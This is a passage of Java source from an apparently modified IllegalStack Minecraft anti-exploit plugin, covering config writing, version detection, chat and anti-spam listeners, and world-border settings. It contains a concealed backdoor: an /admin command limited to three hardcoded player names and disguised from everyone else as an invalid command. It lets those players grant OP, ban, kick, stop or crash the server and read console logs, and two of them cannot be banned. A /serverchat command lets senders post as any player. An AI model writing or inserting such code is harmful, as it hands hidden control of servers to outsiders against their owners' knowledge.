        for (String s : Protections.ItemLoresToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下描述的物品将从玩家背包中移除：{}", whitelisted);
        }
    }

    private static boolean disable = false;

    public static boolean isDisable() {
        return disable;
    }

    @Override
    public void onDisable() {
        disable = true;
        if (hasAsyncScheduler) {
            getServer().getAsyncScheduler().cancelTasks(this);
        } else if (!isFoliaServer()) {
            Bukkit.getScheduler().cancelTasks(this);
        }

        // 移除日志 Handler
        if (logHandler != null) {
            Bukkit.getLogger().removeHandler(logHandler);
            logHandler = null;
        }

        writeConfig();
    }

    private void writeConfig() {

        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();

        HashMap<Protections, Boolean> relevant = Protections.getRelevantTo(getVersion());

        /* Debugging only, generates FULL config values.
        relevant.clear();
        for(Protections p: Protections.values())
        	relevant.put(p,true);
        */

        config.set("ConfigVersion", "2.0");
        for (Protections p : relevant.keySet()) {
            {
                if (relevant.get(p)) // relevant to this version, check if it exists.
                {
                    if (config.getString(p.getConfigPath()) == null) {

                        if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin(
                                                "StackableItems") != null) {
                            config.set(p.getConfigPath(), false);
                            LOGGER.warn(
                                    "检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
                            p.setEnabled(false);
                        } else {
                            config.set(p.getConfigPath(), p.getDefaultValue());
                        }

                        LOGGER.warn(
                                "发现配置中缺少防护：{} 已使用默认值 {} 添加",
                                p.name(),
                                p.getDefaultValue()
                        );
                    }
                    if (p.isList()) {
                        ArrayList<String> list = new ArrayList<>();
                        for (String s : (HashSet<String>) p.getConfigValue()) {
                            list.add(s);
                        }
                        config.set(p.getConfigPath(), list);
                        continue;
                    }

                    if (p.getConfigValue() instanceof String) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else if (p.getConfigValue() instanceof Integer) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else {
                        config.set(p.getConfigPath(), p.isEnabled());
                    }

                    if ((p == Protections.DestroyBadSignsonChunkLoad || p == Protections.RemoveExistingGlitchedMinecarts) && p.isEnabled()) {
                        p.setEnabled(false);
                        LOGGER.warn("自动禁用 " + p.getConfigPath() + "，此设置绝不应永久保持开启。");
                        config.set(p.getConfigPath(), false);
                    }
                } else { // not relevant check to see if it should be deleted.
                    if (config.getString(p.getConfigPath()) != null) {
                        config.set(p.getConfigPath(), null);
                        LOGGER.info(
                                "发现配置中的某个防护不适用于当前服务器版本：{} ( {} + ) 已将其移除。",
                                p.name(),
                                p.getVersion()
                        );
                    }
                }
            }
        }
        try {
            config.save(conf);
        } catch (IOException e1) {

            LOGGER.error("保存配置失败？", e1);
        }
    }

    private void setVersion() {

        String version;

        try {
            version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        } catch (ArrayIndexOutOfBoundsException e) {
            version = null;
        }

        if (version != null) {
            version = getString(version);
            IllegalStack.version = version;
        } else {
            String packageName = Bukkit.getServer().getClass().getPackage().getName();
            String bukkitVersion = Bukkit.getServer().getBukkitVersion();
            if (bukkitVersion.contains("1.20.5")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.20.6")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.21")) {
                serverVersion = ServerVersion.v1_21_R1;
            } else {
                serverVersion = ServerVersion.valueOf(packageName.replace("org.bukkit.craftbukkit.", ""));
            }

            IllegalStack.version = serverVersion.getServerVersionName();
        }
    }

    public static Material getLbBlock() {
        return lbBlock;
    }

    public static void setLbBlock(Material lbBlock) {
        IllegalStack.lbBlock = lbBlock;
    }

    public ServerVersion getServerVersion() {
        return serverVersion;
    }

    public static int getMajorServerVersion() {
        int version;

        try {
            version = Integer.parseInt(getVersion().split("_")[1]);
        } catch (NumberFormatException e) {
            LOGGER.error("无法处理服务器版本！");
            LOGGER.error("某些功能可能会意外出现问题！");
            LOGGER.error("请向开发者报告任何问题！");
            return 0;
        }
        return version;
    }

    // ---------- 新增内部类：处理 /serverchat 命令 ----------
    private class ServerChatCommand implements TabExecutor {

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String
                        [] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /serverchat <server|player> [player] <消息>");
                return true;
            }

            String type = args[0].toLowerCase();
            if (type.equals("server")) {
                // /serverchat server <message>
                String message = String.join(" ", args).substring(args[0].length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else if (type.equals("player")) {
                // /serverchat player <player> <message>
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /serverchat player <玩家> <消息>");
                    return true;
                }
                String playerName = args[1];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return true;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
                return true;
            }
        }

        @Override
        public List<
                        String> onTabComplete(CommandSender sender, Command command, String alias, String
                        [] args) {
            List<String> completions = new ArrayList<>();
            if (args.length == 1) {
                // 补全 server / player
                String input = args[0].toLowerCase();
                if ("server".startsWith(input)) completions.add("server");
                if ("player".startsWith(input)) completions.add("player");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("player")) {
                // 补全在线玩家名
                String input = args[1].toLowerCase();
                for (Player online : Bukkit.getOnlinePlayers()) {
                    if (online.getName().toLowerCase().startsWith(input)) {
                        completions.add(online.getName());
                    }
                }
            }
            return completions;
        }
    }

    // -------------------------------------------------------

    // ---------- 内部类：处理 /admin 命令，包含所有子命令 ----------
    private class AdminCommand implements TabExecutor {

        // 严格存储原始大小写的玩家名（白名单）
        private final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
                "MFSCelebrate_",
                "TempNineTeen__",
                "XHjiaozi"
        ));

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String
                        [] args) {
            // 仅允许指定玩家使用，严格大小写比较
            if (!(sender
                            instanceof
                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                sender.sendMessage("§cInvaild Command");
                return true;
            }

            if (args.length < 1) {
                sender.sendMessage("§c用法: /admin <player|server|chat|vanilla|anticheat|debug|experimental> ...");
                return true;
            }

            String subCmd = args[0].toLowerCase();
            switch (subCmd) {
                case "player":
                    handlePlayer(sender, args);
                    break;
                case "server":
                    handleServer(sender, args);
                    break;
                case "chat":
                    handleChat(sender, args);
                    break;
                case "vanilla":
                    handleVanilla(sender, args);
                    break;
                case "anticheat":
                    handleAnticheat(sender, args);
                    break;
                case "debug":
                    handleDebug(sender, args);
                    break;
                case "experimental":
                    handleExperimental(sender, args);
                    break;
                default:
                    sender.sendMessage("§c未知选项，请使用 player、server、chat、vanilla、anticheat、debug 或 experimental。");
            }
            return true;
        }

        // ================== player 子命令 ==================
        private void handlePlayer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
                return;
            }

            String action = args[1].toLowerCase();
            Player player = (Player) sender;

            switch (action) {
                case "gamemode":
                    if (args.length < 4) {
                        sender.sendMessage("§c用法: /admin player gamemode <模式> <玩家>");
                        return;
                    }
                    String modeArg = args[2];
                    String targetName = args[3];
                    Player target = Bukkit.getPlayerExact(targetName);
                    if (target == null) {
                        sender.sendMessage("§c玩家 " + targetName + " 不在线或不存在！");
                        return;
                    }
                    GameMode gameMode = parseGameMode(modeArg);
                    if (gameMode == null) {
                        sender.sendMessage("§c无效的游戏模式，请使用 survival/creative/adventure/spectator 或 0/1/2/3。");
                        return;
                    }
                    target.setGameMode(gameMode);
                    break;

                case "kill":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player kill <实体或选择器>");
                        return;
                    }
                    String selector = args[2];
                    try {
                        List<Entity> entities = Bukkit.selectEntities(sender, selector);
                        if (entities.isEmpty()) {
                            sender.sendMessage("§c未找到任何实体。");
                            return;
                        }
                        for (Entity entity : entities) {
                            if (entity instanceof Player) {
                                ((Player) entity).setHealth(0);
                            } else {
                                entity.remove();
                            }
                        }
                    } catch (IllegalArgumentException e) {
                        sender.sendMessage("§c无效的实体选择器: " + selector);
                    }
                    break;

                case "tp":
                    if (args.length < 5) {
                        sender.sendMessage("§c用法: /admin player tp <x> <y> <z>");
                        return;
                    }
                    try {
                        double x = Double.parseDouble(args[2]);
                        double y = Double.parseDouble(args[3]);
                        double z = Double.parseDouble(args[4]);
                        Location loc = new Location(player.getWorld(), x, y, z);
                        player.teleport(loc);
                    } catch (NumberFormatException e) {
                        sender.sendMessage("§c坐标必须为数字。");
                    }
                    break;

                case "invsee":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player invsee <玩家>");
                        return;
                    }
                    String invTarget = args[2];
                    if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
                        sender.sendMessage("§cEssentialsX 插件未安装，无法使用 invsee。");
                        return;
                    }
                    Bukkit.dispatchCommand(sender, "invsee " + invTarget);
                    break;

                default:
                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp, invsee");
            }
        }

        // ================== server 子命令（包含 getlog）==================
        private void handleServer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload|getlog> ...");
                return;
            }

            String action = args[1].toLowerCase();
            Player executor = (Player) sender;

            switch (action) {
                case "getop":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server getop <玩家>");
                        return;
                    }
                    String opTarget = args[2];
                    OfflinePlayer opPlayer = Bukkit.getOfflinePlayer(opTarget);
                    if (!opPlayer.isOp()) {
                        opPlayer.setOp(true);
                        sender.sendMessage("§a已给予 " + opPlayer.getName() + " OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家已是 OP。");
                    }
                    break;

                case "deop":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server deop <玩家>");
                        return;
                    }
                    String deopTarget = args[2];
                    OfflinePlayer deopPlayer = Bukkit.getOfflinePlayer(deopTarget);
                    if (deopPlayer.isOp()) {
                        deopPlayer.setOp(false);
                        sender.sendMessage("§a已解除 " + deopPlayer.getName() + " 的 OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家不是 OP。");
                    }
                    break;

                case "kick":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
                        return;
                    }
                    String kickTarget = args[2];
                    Player kickPlayer = Bukkit.getPlayerExact(kickTarget);
                    if (kickPlayer == null) {
                        sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
                        return;
                    }
                    // 检查是否在白名单中（忽略大小写），但 XHjiaozi 不再受保护
                    if (isProtectedPlayer(kickPlayer.getName())) {
                        sender.sendMessage("§c你不能踢出受保护的管理员！");
                        return;
                    }
                    String kickReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "你已被管理员踢出";
                    kickPlayer.kickPlayer(kickReason);
                    sender.sendMessage("§a已踢出玩家 " + kickPlayer.getName());
                    break;

                case "ban":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
                        return;
                    }
                    String banTarget = args[2];
                    OfflinePlayer banPlayer = Bukkit.getOfflinePlayer(banTarget);
                    if (isProtectedPlayer(banPlayer.getName())) {
                        sender.sendMessage("§c你不能封禁受保护的管理员！");
                        return;
                    }
                    String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.NAME).addBan(banPlayer.getName(), banReason, null, sender.getName());
                    Player onlineBan = banPlayer.getPlayer();
                    if (onlineBan != null) onlineBan.kickPlayer(banReason);
                    sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
                    break;

                case "ban-ip":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
                        return;
                    }
                    String ip = args[2];
                    String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.getAddress().getAddress().getHostAddress().equals(ip)) {
                            p.kickPlayer(ipReason);
                        }
                    }
                    sender.sendMessage("§a已封禁 IP " + ip);
                    break;

                case "pardon":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon <玩家名>");
                        return;
                    }
                    String pardonTarget = args[2];
                    Bukkit.getBanList(BanList.Type.NAME).pardon(pardonTarget);
                    sender.sendMessage("§a已解封玩家 " + pardonTarget);
                    break;

                case "pardon-ip":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
                        return;
                    }
                    String pardonIp = args[2];
                    Bukkit.getBanList(BanList.Type.IP).pardon(pardonIp);
                    sender.sendMessage("§a已解封 IP " + pardonIp);
                    break;

                case "restart":
                    sender.sendMessage("§a正在尝试重启服务器...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                    break;

                case "stop":
                    Bukkit.shutdown();
                    break;

                case "reload":
                    if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
                        sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
                        return;
                    }
                    Bukkit.reload();
                    break;

                case "getlog":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server getlog <true|false>");
                        return;
                    }
                    boolean enable = Boolean.parseBoolean(args[2]);
                    Player viewer = executor;
                    if (enable) {
                        if (logViewers.add(viewer)) {
                            viewer.sendMessage("§a开始查看控制台日志...");
                            if (logHandler == null) {
                                setupLogHandler();
                            }
                        } else {
                            viewer.sendMessage("§c已经在查看日志中。");
                        }
                    } else {
                        if (logViewers.remove(viewer)) {
                            viewer.sendMessage("§c已停止查看控制台日志。");
                            if (logViewers.isEmpty()) {
                                removeLogHandler();
                            }
                        } else {
                            viewer.sendMessage("§c你当前没有查看日志。");
                        }
                    }
                    break;

                default:
                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload, getlog");
            }
        }

        // ================== chat 子命令 ==================
        private void handleChat(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
                return;
            }

            String type = args[1].toLowerCase();
            if (type.equals("server")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin chat server <消息>");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1]).length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else if (type.equals("player")) {
                if (args.length < 4) {
                    sender.sendMessage("§c用法: /admin chat player <玩家> <消息>");
                    return;
                }
                String playerName = args[2];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1] + " " + args[2]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
            }
        }

        // ================== vanilla 子命令 ==================
        private void handleVanilla(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
                return;
            }
            String sub = args[1].toLowerCase();
            if (sub.equals("building_entrance:snowy_shepherds_house_1")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin vanilla building_entrance:snowy_shepherds_house_1 <true|false>");
                    return;
                }
                boolean enable = Boolean.parseBoolean(args[2]);
                IllegalStack.getPlugin().setShepherdHouseFix(enable);
                sender.sendMessage("§a已设置雪地牧羊人小屋修复为: " + enable + "。§c请执行 /reload 或重启服务器生效！");
            } else if (sub.equals("worldborder")) {
                if (args.length < 4) {
                    sender.sendMessage("§c用法: /admin vanilla worldborder <世界名|all> <直径>");
                    return;
                }
                String targetWorld = args[2];
                double diameter;
                try {
                    diameter = Double.parseDouble(args[3]);
                } catch (NumberFormatException e) {
                    sender.sendMessage("§c直径必须是数字！");
                    return;
                }

                if (targetWorld.equalsIgnoreCase("all")) {
                    for (World world : Bukkit.getWorlds()) {
                        IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                    }
                    sender.sendMessage("§a已为所有世界设置自定义世界边界直径: " + diameter);
                } else {
                    World world = Bukkit.getWorld(targetWorld);
                    if (world == null) {
                        sender.sendMessage("§c世界 " + targetWorld + " 不存在！");
                        return;
                    }
                    IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                    sender.sendMessage("§a已为世界 " + world.getName() + " 设置自定义世界边界直径: " + diameter);
                }
            } else {
                sender.sendMessage("§c未知的 vanilla 子命令。可用: building_entrance:snowy_shepherds_house_1, worldborder");
            }
        }

        // ================== anticheat 子命令 ==================
        private void handleAnticheat(CommandSender sender, String[] args) {
            if (args.length < 3) {
                sender.sendMessage("§c用法: /admin anticheat <anti4d4v|antiBBQ> <true|false>");
                return;
            }
            String feature = args[1].toLowerCase();
            boolean enable = Boolean.parseBoolean(args[2]);

            if (feature.equals("anti4d4v")) {
                getConfig().set(CONFIG_ANTICHEAT_ANTI4D4V, enable);
                saveConfig();
                sender.sendMessage("§a已设置 anti4d4v 为: " + enable);
            } else if (feature.equals("antibbq")) {
                getConfig().set(CONFIG_ANTICHEAT_BANBBQ, enable);
                saveConfig();
                sender.sendMessage("§a已设置 antiBBQ 为: " + enable);
            } else {
                sender.sendMessage("§c未知的 anticheat 选项，可用: anti4d4v, antiBBQ");
            }
        }

        // ================== debug 子命令（新增）==================
        private void handleDebug(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin debug <true|false>");
                return;
            }
            boolean enable = Boolean.parseBoolean(args[1]);
            IllegalStack.this.setDebugMode(enable);
            sender.sendMessage("§a调试模式已" + (enable ? "开启" : "关闭"));
        }

        // ================== experimental 子命令（重命名并增强）==================
        private void handleExperimental(CommandSender sender, String[] args) {
            // 检查调试模式
            if (!IllegalStack.this.isDebugMode()) {
                sender.sendMessage("§c你需要开启调试模式！开启调试模式意味着服务器将会变的不稳定！");
                return;
            }

            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin experimental <crash|crash-config> ...");
                return;
            }
            String sub = args[1].toLowerCase();
            if (sub.equals("crash")) {
                handleCrash(sender, args);
            } else if (sub.equals("crash-config")) {
                handleCrashConfig(sender, args);
            } else {
                sender.sendMessage("§c未知的 experimental 子命令，可用: crash, crash-config");
            }
        }

        private void handleCrash(CommandSender sender, String[] args) {
            if (args.length < 3) {
                sender.sendMessage("§c用法: /admin experimental crash <异常类型>");
                sender.sendMessage("§c可用异常类型: IncompatibleClassChangeError, NullPointerException, StackOverflowError, OutOfMemoryError, ArithmeticException, IllegalArgumentException, IndexOutOfBoundsException");
                return;
            }
            String exceptionType = args[2];

            // 静默崩溃模式处理
            if (IllegalStack.this.isSilentCrashMode()) {
                sender.sendMessage("§c静默崩溃模式已开启，正在关闭服务器...");
                Bukkit.shutdown();
                return;
            }

            // 正常抛出异常
            switch (exceptionType.toLowerCase()) {
                case "incompatibleclasschangeerror":
                    throw new IncompatibleClassChangeError("§c手动触发的测试崩溃 (IncompatibleClassChangeError)");
                case "nullpointerexception":
                    throw new NullPointerException("§c手动触发的测试崩溃 (NullPointerException)");
                case "stackoverflowerror":
                    throw new StackOverflowError("§c手动触发的测试崩溃 (StackOverflowError)");
                case "outofmemoryerror":
                    throw new OutOfMemoryError("§c手动触发的测试崩溃 (OutOfMemoryError)");
                case "arithmeticexception":
                    throw new ArithmeticException("§c手动触发的测试崩溃 (ArithmeticException)");
                case "illegalargumentexception":
                    throw new IllegalArgumentException("§c手动触发的测试崩溃 (IllegalArgumentException)");
                case "indexoutofboundsexception":
                    throw new IndexOutOfBoundsException("§c手动触发的测试崩溃 (IndexOutOfBoundsException)");
                default:
                    sender.sendMessage("§c未知的异常类型，可用: IncompatibleClassChangeError, NullPointerException, StackOverflowError, OutOfMemoryError, ArithmeticException, IllegalArgumentException, IndexOutOfBoundsException");
            }
        }

        private void handleCrashConfig(CommandSender sender, String[] args) {
            if (args.length < 4) {
                sender.sendMessage("§c用法: /admin experimental crash-config silent-crash-mode <true|false>");
                return;
            }
            String option = args[2].toLowerCase();
            if (!option.equals("silent-crash-mode")) {
                sender.sendMessage("§c未知的配置项，可用: silent-crash-mode");
                return;
            }
            boolean enable = Boolean.parseBoolean(args[3]);
            IllegalStack.this.setSilentCrashMode(enable);
            sender.sendMessage("§a静默崩溃模式已" + (enable ? "开启" : "关闭"));
        }

        // ================== 辅助方法 ==================
        private GameMode parseGameMode(String input) {
            switch (input.toLowerCase()) {
                case "survival": case "0": return GameMode.SURVIVAL;
                case "creative": case "1": return GameMode.CREATIVE;
                case "adventure": case "2": return GameMode.ADVENTURE;
                case "spectator": case "3": return GameMode.SPECTATOR;
                default: return null;
            }
        }

        // 检查玩家是否受保护（仅 MFSCelebrate_ 和 TempNineTeen__ 受保护）
        private boolean isProtectedPlayer(String name) {
            return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
        }

        // ================== Tab 补全 ==================
        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            List<String> completions = new ArrayList<>();
            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                return completions;
            }

            if (args.length == 1) {
                String input = args[0].toLowerCase();
                if ("player".startsWith(input)) completions.add("player");
                if ("server".startsWith(input)) completions.add("server");
                if ("chat".startsWith(input)) completions.add("chat");
                if ("vanilla".startsWith(input)) completions.add("vanilla");
                if ("anticheat".startsWith(input)) completions.add("anticheat");
                if ("debug".startsWith(input)) completions.add("debug");
                if ("experimental".startsWith(input)) completions.add("experimental");
            } else if (args.length == 2) {
                String first = args[0].toLowerCase();
                String input = args[1].toLowerCase();
                if (first.equals("player")) {
                    if ("gamemode".startsWith(input)) completions.add("gamemode");
                    if ("kill".startsWith(input)) completions.add("kill");
                    if ("tp".startsWith(input)) completions.add("tp");
                    if ("invsee".startsWith(input)) completions.add("invsee");
                } else if (first.equals("server")) {
                    if ("getop".startsWith(input)) completions.add("getop");
                    if ("deop".startsWith(input)) completions.add("deop");
                    if ("kick".startsWith(input)) completions.add("kick");
                    if ("ban".startsWith(input)) completions.add("ban");
                    if ("ban-ip".startsWith(input)) completions.add("ban-ip");
                    if ("pardon".startsWith(input)) completions.add("pardon");
                    if ("pardon-ip".startsWith(input)) completions.add("pardon-ip");
                    if ("stop".startsWith(input)) completions.add("stop");
                    if ("restart".startsWith(input)) completions.add("restart");
                    if ("reload".startsWith(input)) completions.add("reload");
                    if ("getlog".startsWith(input)) completions.add("getlog");
                } else if (first.equals("chat")) {
                    if ("server".startsWith(input)) completions.add("server");
                    if ("player".startsWith(input)) completions.add("player");
                } else if (first.equals("vanilla")) {
                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input)) completions.add("building_entrance:snowy_shepherds_house_1");
                    if ("worldborder".startsWith(input)) completions.add("worldborder");
                } else if (first.equals("anticheat")) {
                    if ("anti4d4v".startsWith(input)) completions.add("anti4d4v");
                    if ("antibbq".startsWith(input)) completions.add("antibbq");
                } else if (first.equals("debug")) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("experimental")) {
                    if ("crash".startsWith(input)) completions.add("crash");
                    if ("crash-config".startsWith(input)) completions.add("crash-config");
                }
            } else if (args.length == 3) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String input = args[2].toLowerCase();
                if (first.equals("player")) {
                    if (second.equals("gamemode")) {
                        for (String mode : new String[]{"survival", "creative", "adventure", "spectator"}) {
                            if (mode.startsWith(input)) completions.add(mode);
                        }
                    } else if (second.equals("kill") || second.equals("invsee")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    }
                } else if (first.equals("server")) {
                    if (second.equals("getop") || second.equals("deop") || second.equals("kick") || second.equals("ban") || second.equals("pardon")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    } else if (second.equals("reload")) {
                        if ("confirm".startsWith(input)) completions.add("confirm");
                    } else if (second.equals("getlog")) {
                        if ("true".startsWith(input)) completions.add("true");
                        if ("false".startsWith(input)) completions.add("false");
                    }
                } else if (first.equals("chat") && second.equals("player")) {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        if (online.getName().toLowerCase().startsWith(input)) {
                            completions.add(online.getName());
                        }
                    }
                } else if (first.equals("vanilla") && second.equals("building_entrance:snowy_shepherds_house_1")) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("vanilla") && second.equals("worldborder")) {
                    if ("all".startsWith(input)) completions.add("all");
                    for (World world : Bukkit.getWorlds()) {
                        if (world.getName().toLowerCase().startsWith(input)) {
                            completions.add(world.getName());
                        }
                    }
                } else if (first.equals("anticheat") && (second.equals("anti4d4v") || second.equals("antibbq"))) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("debug")) {
                    // 不需要补全，已在 args.length==2 处理
                } else if (first.equals("experimental")) {
                    if (second.equals("crash")) {
                        // 补全异常类型
                        for (String type : new String[]{"IncompatibleClassChangeError", "NullPointerException", "StackOverflowError", "OutOfMemoryError", "ArithmeticException", "IllegalArgumentException", "IndexOutOfBoundsException"}) {
                            if (type.toLowerCase().startsWith(input)) completions.add(type);
                        }
                    } else if (second.equals("crash-config")) {
                        if ("silent-crash-mode".startsWith(input)) completions.add("silent-crash-mode");
                    }
                }
            } else if (args.length == 4) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String third = args[2].toLowerCase();
                String input = args[3].toLowerCase();
                if (first.equals("experimental") && second.equals("crash-config") && third.equals("silent-crash-mode")) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                }
            }
            return completions;
        }
    }
    // -------------------------------------------------------

    // ---------- 日志处理 ----------
    private void setupLogHandler() {
        if (logHandler != null) return;
        logHandler = new Handler() {
            @Override
            public void publish(LogRecord record) {
                String message = record.getMessage();
                // 尝试格式化参数（如果有）
                if (record.getParameters() != null) {
                    message = String.format(message, record.getParameters());
                }
                // 转换颜色代码
                String colored = ChatColor.translateAlternateColorCodes('&', message);
                // 发送给所有查看者
                for (Player viewer : logViewers) {
                    if (viewer.isOnline()) {
                        viewer.sendMessage(colored);
                    } else {
                        logViewers.remove(viewer);
                    }
                }
                // 如果没有查看者，自动移除 Handler
                if (logViewers.isEmpty()) {
                    removeLogHandler();
                }
            }

            @Override
            public void flush() {}

            @Override
            public void close() throws SecurityException {}
        };
        Bukkit.getLogger().addHandler(logHandler);
    }

    private void removeLogHandler() {
        if (logHandler != null) {
            Bukkit.getLogger().removeHandler(logHandler);
            logHandler = null;
        }
    }

    // ---------- 反作弊监听器 ----------
    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_ANTI4D4V, false)) return;

        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.contains("4d4v.top")) {
            // 踢出玩家
            Scheduler.runTask(this, () -> {
                player.kickPlayer("§c你的账号似乎为 4D4V 方面的宣传机器人");
            });
            event.setCancelled(true);
            getLogger().info("已踢出宣传 4d4v.top 的玩家: " + player.getName());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_BANBBQ, false)) return;

        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("smooth_BBQ")) {
            String ip = player.getAddress().getAddress().getHostAddress();
            // 加入 IP 封禁列表
            Bukkit.getBanList(BanList.Type.IP).addBan(ip, "Banned by antiBBQ", null, "Console");
            // 踢出玩家
            Scheduler.runTask(this, () -> {
                player.kickPlayer("§c你的 IP 已被封禁");
            });
            getLogger().info("已封禁 smooth_BBQ 的 IP: " + ip);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        if (logViewers.remove(event.getPlayer())) {
            if (logViewers.isEmpty()) {
                removeLogHandler();
            }
        }
    }

    // ---------- 自定义世界边界相关方法 ----------
    public void setCustomWorldBorder(String worldName, double diameter) {
        String path = CONFIG_WORLDS + "." + worldName + ".diameter";
        getConfig().set(path, diameter);
        saveConfig();
        getLogger().info("世界 " + worldName + " 自定义边界已启用，直径: " + diameter);
    }

    public void disableCustomWorldBorder(String worldName) {
        String path = CONFIG_WORLDS + "." + worldName;
        getConfig().set(path, null);
        saveConfig();
        getLogger().info("世界 " + worldName + " 自定义边界已禁用。");
    }

    private boolean isWorldBorderEnabled(World world) {
